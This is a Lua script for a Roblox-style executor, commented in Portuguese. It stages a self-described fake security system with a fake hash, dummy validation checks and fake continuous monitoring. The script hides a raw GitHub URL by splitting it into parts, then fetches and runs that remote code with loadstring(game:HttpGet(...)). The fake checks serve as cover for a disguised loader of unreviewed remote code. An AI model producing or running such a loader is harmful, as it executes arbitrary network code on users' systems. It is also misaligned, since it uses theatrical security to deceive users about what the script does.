--------------------------------------------------
-- PARTE 1 — SISTEMA DE SEGURANÇA (FAKE REAL)
--------------------------------------------------

local SecureCore = {}
local RuntimeState = {}

RuntimeState.session = tostring(math.random(100000,999999)) .. "-" .. tostring(os.clock())
RuntimeState.integrity = true
RuntimeState.executor = "AUTHORIZED"

local function fakeHash()
    local h = ""
    for i = 1, 64 do
        h = h .. string.char(math.random(97,102))
    end
    return h
end

SecureCore.hash = fakeHash()

for i = 1, 5 do
    task.wait(0.15)
end

if not RuntimeState.integrity then
    while true do end
end

--------------------------------------------------
-- PARTE 2 — NÚCLEO REAL (ESCONDIDO)
--------------------------------------------------

local p1 = "https://raw.githubusercontent.com/"
local p2 = "erickmth/scriptfinal/refs/heads/main/"
local p3 = "lua.lua"

local RealPayload = p1 .. p2 .. p3

--------------------------------------------------
-- PARTE 3 — VALIDAÇÕES FALSAS + EXECUÇÃO
--------------------------------------------------

local Validator = {}

function Validator:environmentCheck()
    task.wait(0.2)
    return true
end

function Validator:executorCheck()
    task.wait(0.2)
    return RuntimeState.executor == "AUTHORIZED"
end

function Validator:sessionCheck()
    task.wait(0.2)
    return #RuntimeState.session > 5
end

local checks = {
    Validator:environmentCheck(),
    Validator:executorCheck(),
    Validator:sessionCheck()
}

for _, status in pairs(checks) do
    if status ~= true then
        while true do end
    end
end

task.wait(0.3)

-- JUNÇÃO FINAL + EXECUÇÃO
local FinalLoader = loadstring(game:HttpGet(RealPayload))
FinalLoader()

--------------------------------------------------
-- MONITORAMENTO FAKE CONTÍNUO
--------------------------------------------------

task.spawn(function()
    while true do
        task.wait(10)
        SecureCore.hash = fakeHash()
    end
end)
